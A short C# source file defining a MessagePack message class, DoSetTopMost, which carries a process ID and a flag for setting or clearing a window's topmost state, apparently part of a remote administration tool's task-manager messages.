using MessagePack;
using Pulsar.Common.Messages.Other;

namespace Pulsar.Common.Messages.Administration.TaskManager
{
    [MessagePackObject]
    public class DoSetTopMost : IMessage
    {
        [Key(1)]
        public int Pid { get; set; }

        [Key(2)]
        public bool Enable { get; set; } // true = make topmost, false = remove
    }
}
